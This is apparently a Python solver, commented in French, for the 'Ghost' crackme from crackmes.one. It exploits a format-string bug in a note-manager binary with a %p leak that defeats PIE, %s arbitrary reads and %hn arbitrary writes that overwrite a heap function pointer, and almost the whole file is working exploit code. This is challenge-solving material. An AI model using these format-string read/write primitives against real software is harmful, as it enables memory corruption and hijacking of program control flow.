#!/usr/bin/env python3
"""
0xf00's Ghost (crackmes.one 682f69bd6297cca3ff7d7b9b) -- solveur.

Pas un "serial" : c'est un petit note-manager ("1. Add / 2. Update / 3. Erase
/ 4. Trigger / 5. Leak / 6. Chaos / 7. Quit") avec une *format string* dans
"5. Leak" (`printf(buf)` direct sur un buffer saisi par l'utilisateur).

Exploit (voir le README pour le detail complet) :
  1. leak de l'adresse de retour de "call sub_1790" (case 5) dans main()
     via "%17$p" -> calcule la base PIE (page-alignee).
  2. lecture arbitraire (arg %N$s qui dereference un pointeur controle) du
     slot de note qword_41A0[0], puis de son champ "meta" (struct+8) : donne
     l'adresse heap du pointeur de fonction utilise par "4. Trigger".
  3. ecriture arbitraire (write-what-where classique en 2x %hn, 16 bits
     chacun) : on ne reecrit que les 32 bits BAS de ce pointeur de fonction
     -- les 32 bits hauts sont deja corrects, car l'ancienne ET la nouvelle
     valeur sont deux adresses du MEME binaire PIE (meme base).
  4. "4. Trigger" sur le slot 0 appelle alors directement sub_1960 (fonction
     "noreturn" qui imprime le message et exit(0)) au lieu de la fonction
     d'affichage normale.

Usage:
    ./ghost-solve.py                  # exploite le binaire et affiche le message
    ./ghost-solve.py --check          # comme ci-dessus, code de sortie 0/1
    ./ghost-solve.py --binary PATH    # cible un autre exemplaire du binaire
"""
import argparse
import itertools
import os
import re
import select
import struct
import subprocess
import sys
import time

DEFAULT_BIN = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "original", "ghost")

RET_SUB1790_OFFSET = 0x126A  # retour de "call sub_1790" dans main() (case 5 "Leak")
SLOTS_OFFSET = 0x41A0        # qword_41A0[9] (.bss) : pointeurs des notes
SUB_1960_OFFSET = 0x1960     # fonction "win" (imprime le message, exit(0))
WIN_TEXT = b"Congratulations"


class Ghost:
    """E/S binaire-safe sur des pipes bruts (pas de pty -> pas d'echo/edition
    de ligne qui casserait les octets de controle de nos payloads)."""

    def __init__(self, binary):
        self.p = subprocess.Popen(
            [binary], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, bufsize=0,
        )
        self.buf = b""

    def _read_until(self, marker=b"$ ", timeout=3.0):
        end = time.time() + timeout
        while marker not in self.buf:
            r, _, _ = select.select([self.p.stdout], [], [], max(0, end - time.time()))
            if not r:
                return self.buf
            chunk = os.read(self.p.stdout.fileno(), 65536)
            if not chunk:
                return self.buf
            self.buf += chunk
        idx = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:idx], self.buf[idx:]
        return out

    def send(self, data: bytes):
        self.p.stdin.write(data)
        self.p.stdin.flush()

    def menu(self):
        return self._read_until(b"$ ")

    def add(self, data: bytes):
        self.send(b"1\n")
        self._read_until(b"Note: ")
        self.send(data + (b"" if data.endswith(b"\n") else b"\n"))
        return self.menu()

    def trigger(self, idx):
        self.send(b"4\n")
        self._read_until(b"ID: ")
        self.send(f"{idx}\n".encode())
        return self.menu()

    def leak(self, data: bytes, timeout=3.0):
        self.send(b"5\n")
        self._read_until(b"Leak: ")
        self.send(data + (b"" if data.endswith(b"\n") else b"\n"))
        return self._read_until(b"$ ", timeout=timeout)

    def close(self):
        try:
            self.p.kill()
        except Exception:
            pass


def read_ptr(g, addr):
    """Lecture arbitraire de 8 octets a `addr` via "%7$s" (le pointeur est
    place APRES le texte du format, jamais avant : ses 2 octets hauts sont
    toujours 0x00 -> ca tronquerait la "chaine" si on le mettait en tete)."""
    payload = b"%7$s" + b"AAAA" + struct.pack("<Q", addr)
    out = g.leak(payload)
    idx = out.find(b"AAAA")
    raw = out[:idx]
    return int.from_bytes(raw.ljust(8, b"\x00")[:8], "little")


def _build_text(words, order, start_pos):
    text, count = b"", 0
    for idx in order:
        want = words[idx]
        pad = (want - count) % 65536
        text += f"%{start_pos+idx}$hn".encode() if pad == 0 else f"%{pad}c%{start_pos+idx}$hn".encode()
        count = (count + pad) % 65536
    return text


def fmt_write_low32(addr_lo, addr_hi, value32):
    """Ecrit les 32 bits bas de `value32` sur [addr_lo, addr_hi=addr_lo+2] via
    2x %hn (le classique "write-what-where" par compteur de caracteres
    imprimes). Les 2 pointeurs sont places APRES le texte, alignes sur 8
    octets ; leur position d'argument depend donc de la longueur (paddee) de
    ce texte -- point fixe resolu en quelques iterations (positions a 1
    chiffre, converge immediatement)."""
    words = [value32 & 0xFFFF, (value32 >> 16) & 0xFFFF]
    start_pos = 6
    for _ in range(4):
        best = min(
            (( _build_text(words, order, start_pos), order) for order in itertools.permutations(range(2))),
            key=lambda t: len(t[0]),
        )
        text, order = best
        pad_len = (-len(text)) % 8
        text_padded = text + b"Z" * pad_len
        needed_pos = 6 + len(text_padded) // 8
        if needed_pos == start_pos:
            addr_bytes = struct.pack("<Q", addr_lo) + struct.pack("<Q", addr_hi)
            return text_padded + addr_bytes
        start_pos = needed_pos
    raise RuntimeError("point fixe non atteint")


def exploit(binary, quiet=False):
    def log(*a):
        if not quiet:
            print(*a)

    g = Ghost(binary)
    g.menu()
    g.add(b"petik")  # occupe le slot 0

    out = g.leak(b"%17$p")
    m = re.search(rb"0x[0-9a-f]+", out)
    if not m:
        g.close()
        raise RuntimeError(f"leak de base echoue: {out!r}")
    base = int(m.group(0), 16) - RET_SUB1790_OFFSET
    if base % 0x1000 != 0:
        g.close()
        raise RuntimeError(f"base non alignee ({hex(base)}), leak incorrect")
    log(f"[+] base PIE       = {hex(base)}")

    struct_ptr = read_ptr(g, base + SLOTS_OFFSET)
    meta_ptr = read_ptr(g, struct_ptr + 8) if struct_ptr else 0
    log(f"[+] note[0] struct = {hex(struct_ptr)}")
    log(f"[+] note[0] meta   = {hex(meta_ptr)}")
    # heap valide attendu : memes 32 bits hauts que la base PIE (meme image)
    if struct_ptr < 0x1000 or meta_ptr < 0x1000 or (meta_ptr >> 32) != (base >> 32):
        g.close()
        raise RuntimeError(f"lecture heap incoherente (struct={hex(struct_ptr)} meta={hex(meta_ptr)})")

    target = base + SUB_1960_OFFSET
    payload = fmt_write_low32(meta_ptr, meta_ptr + 2, target & 0xFFFFFFFF)
    log(f"[+] *meta <- {hex(target)} (payload {len(payload)}o)")
    g.leak(payload)

    out = g.trigger(0)
    g.close()
    return out


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--binary", default=DEFAULT_BIN, help="chemin du binaire ghost")
    ap.add_argument("-q", "--quiet", action="store_true", help="n'affiche que le resultat")
    ap.add_argument("--check", action="store_true", help="code de sortie 0/1, pas de sortie texte")
    args = ap.parse_args()

    out = b""
    last_err = None
    for attempt in range(5):  # la lecture heap est fiable a ~90%/run (rand() de "Erase" non implique ici, juste
        try:                  # un alea rare sur l'auto-detection du marqueur) ; on relance le process si besoin
            out = exploit(args.binary, quiet=args.quiet or args.check)
            if WIN_TEXT in out:
                break
        except RuntimeError as e:
            last_err = e
    else:
        if last_err and not (args.quiet or args.check):
            print(f"[-] {last_err}", file=sys.stderr)
    ok = WIN_TEXT in out
    if not args.check:
        print(out.decode(errors="replace").strip())
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
